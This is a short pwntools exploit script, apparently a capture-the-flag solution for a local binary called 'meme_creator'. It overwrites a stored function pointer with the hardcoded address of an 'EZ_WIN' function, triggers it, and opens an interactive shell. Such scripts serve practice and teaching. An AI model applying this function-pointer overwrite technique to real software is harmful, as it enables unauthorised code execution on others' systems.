from pwn import *
# Set up the binary and context
context.binary = './meme_creator'
binary = context.binary

# Start the process
p = process(binary.path)

# Step 1: Create a new meme to allocate memory
p.sendlineafter('Choice: ', '1')
p.sendlineafter('Enter meme size: ', '32')
p.sendlineafter('Enter meme content: ', 'A' * 31)

# Step 2: Edit the meme to overwrite the function pointer
p.sendlineafter('Choice: ', '2')
p.sendlineafter('Index: ', '0')

# Overwrite the function pointer with the address of EZ_WIN
# Assuming the address of EZ_WIN is known (e.g., from binary analysis)
ez_win_address = 0x4014A0
payload = p64(ez_win_address)
p.sendline(payload)

# Step 3: Trigger the EZ_WIN function by printing the meme
p.sendlineafter('Choice: ', '3')
p.sendlineafter('Index: ', '0')

# Interact with the shell
p.interactive()
